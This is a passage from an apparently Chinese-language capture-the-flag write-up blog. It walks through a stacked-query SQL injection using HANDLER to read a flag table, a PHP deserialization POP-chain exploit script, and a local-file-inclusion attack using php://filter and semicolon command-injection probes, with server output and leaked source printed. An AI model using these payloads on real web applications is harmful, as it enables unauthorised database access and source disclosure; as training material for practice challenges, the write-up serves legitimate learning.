class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;ctftraining&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;information_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;mysql&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;performance_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;supersqli&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>&#125;<br><br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">from</span> supersqli;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;FlagHere&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;words&quot;</span><br>&#125;<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">colums</span> <span class="hljs-variable">from</span> <span class="hljs-title class_">FlagHere</span>;#<br>ä¸å›æ˜¾<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">CLOSE</span>;<br>æˆ–è€…<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<br><span class="hljs-comment">//flag&#123;0bc2fe53-291d-4d3d-9a1c-adc6d658396e&#125;</span><br></code></pre></td></tr></table></figure>
<p>ä¸è¯´äº†ï¼ŒåŸé¢˜æ˜¯2019ç½‘é¼æ¯ éšä¾¿æ³¨ï¼Œé™åˆ¶äº†é‡å‘½åå’Œé¢„ç¼–è¯‘è§£æ³•ï¼Œä½†æ˜¯èƒ½ç”¨handlerï¼Œå¤åˆ¶ç²˜è´´payloadå³å¯è§£ã€‚ã€‚ã€‚</p>
<h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-pop"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-pop" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop</h1><p>ä»¥å‰çš„é¢˜ï¼Œåšäº†å¥½ä¹…ï¼Œçœ‹äº†ä¸€çœ¼ä»¥å‰çš„wpï¼ŒåŠ ä¸ŠAreUSerialzï¼Œä»¥åé™¤äº†publicç±»è¿˜æ˜¯ç›´æ¥åœ¨åŸæ¥çš„classé‡Œç›´æ¥èµ‹å€¼çš„å¥½ï¼Œä¸ç„¶ä¸€ç›´å‡ºé—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>æ‹¿åˆ°é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ°è¿™èƒ½æä¾›çŒ«çŒ«å’Œç‹—ç‹—çš„å›¾ç‰‡ï¼Œéšä¾¿é€‰ä¸€ä¸ª  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/index.php?<span class="hljs-attribute">category</span>=woofers<br></code></pre></td></tr></table></figure>
<p>fuzzä¸€ä¸‹  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=woofers;ls<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(woofers;ls.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;woofers;ls.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br>/<span class="hljs-keyword">index</span>.php?category=<span class="hljs-keyword">index</span><br><br>Sorry, we currently <span class="hljs-keyword">only</span> support woofers <span class="hljs-keyword">and</span> meowers.<br><br>/<span class="hljs-keyword">index</span>.php?category=meowers;flag<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(meowers;flag.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;meowers;flag.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure>
<p>ä¸€èˆ¬è¿™ç§æœ‰includeå‡½æ•°çš„å¯ä»¥è¯•è¯•ä¼ªåè®®,ç„¶ååˆšæ‰å°±æœ‰ç«™ç‚¹ç›®å½•äº†ï¼Œè¯•ä¸€ä¸‹ç›®å½•ç©¿è¶Šçœ‹çœ‹flagæ˜¯å¦åœ¨æ ¹ç›®å½•<br>ç„¶åè‹¥æ˜¯æ²¡æœ‰é‚£ä¸ªç›®å½•ä¼šè¿”å›ï¼š<br>Sorry, we currently only support woofers and meowers.  </p>
<p>ç„¶åå°±æ˜¯èƒ½ç”¨<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index<br>æ¥è¿”å›indexæ–‡ä»¶çš„base64<br>æ³¨æ„åˆ°æºç é‡Œä¼šè‡ªåŠ¨ç»™å®ƒåŠ ä¸Š.php  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: operation failed <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=index.php.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure>
<p>åˆ°ç°åœ¨èƒ½æƒ³åˆ°çš„æ˜¯æƒ³åŠæ³•ç›®å½•ç©¿è¶Šåˆ°æ ¹ç›®å½•ä¸‹è¯»å–flagï¼Œ  </p>
<p>å…ˆæ˜¯  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.php?category=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
<p>æ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Images that spark joy&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Had a bad day?&lt;/title&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/material.min.css&quot;</span>&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>--<span class="hljs-title">fixed</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100&quot;&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">header</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>--<span class="hljs-title">scroll</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100 <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>-<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">title</span>&quot;&gt;<span class="hljs-title">Had</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>?&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">spacer</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">header</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">ribbon</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">main</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">main</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__content</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">container</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">grid</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--2-<span class="hljs-title">col</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">tablet</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">phone</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">white</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">shadow</span>--4<span class="hljs-title">dp</span> <span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800 <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--8-<span class="hljs-title">col</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">crumbs</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-500&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Cheer</span> <span class="hljs-title">up</span>!&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">                <span class="hljs-title">Did</span> <span class="hljs-title">you</span> <span class="hljs-title">have</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>? <span class="hljs-title">Did</span> <span class="hljs-title">things</span> <span class="hljs-title">not</span> <span class="hljs-title">go</span> <span class="hljs-title">your</span> <span class="hljs-title">way</span> <span class="hljs-title">today</span>? <span class="hljs-title">Are</span> <span class="hljs-title">you</span> <span class="hljs-title">feeling</span> <span class="hljs-title">down</span>? <span class="hljs-title">Pick</span> <span class="hljs-title">an</span> <span class="hljs-title">option</span> <span class="hljs-title">and</span> <span class="hljs-title">let</span> <span class="hljs-title">the</span> <span class="hljs-title">adorable</span> <span class="hljs-title">images</span> <span class="hljs-title">cheer</span> <span class="hljs-title">you</span> <span class="hljs-title">up</span>!</span><br><span class="hljs-class">              &lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">include</span>&quot;&gt;</span><br><span class="hljs-class">              &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">				$<span class="hljs-title">file</span> = $<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">category</span>&#x27;];</span><br><span class="hljs-class"></span><br><span class="hljs-class">				<span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span><br><span class="hljs-class">				</span>&#123;<br>					<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))  <span class="hljs-comment">//è¦æœ‰åŒ¹é…çš„å­—ç¬¦æ‰èƒ½è¿›åˆ°ä¸‹ä¸€æ­¥çš„includeå‡½æ•°</span><br>						<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>					&#125;<br>					<span class="hljs-keyword">else</span>&#123;<br>						<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>					&#125;<br>				&#125;<br>				<span class="hljs-meta">?&gt;</span><br>			&lt;/div&gt;<br>          &lt;form action=<span class="hljs-string">&quot;index.php&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span> id=<span class="hljs-string">&quot;choice&quot;</span>&gt;<br>              &lt;center&gt;&lt;button onclick=<span class="hljs-string">&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot;</span> name=<span class="hljs-string">&quot;category&quot;</span> value=<span class="hljs-string">&quot;woofers&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Woofers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">button</span> <span class="hljs-title">onclick</span>=&quot;<span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">choice</span>&#x27;).<span class="hljs-title">submit</span>();&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">category</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">meowers</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Meowers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">          &lt;/<span 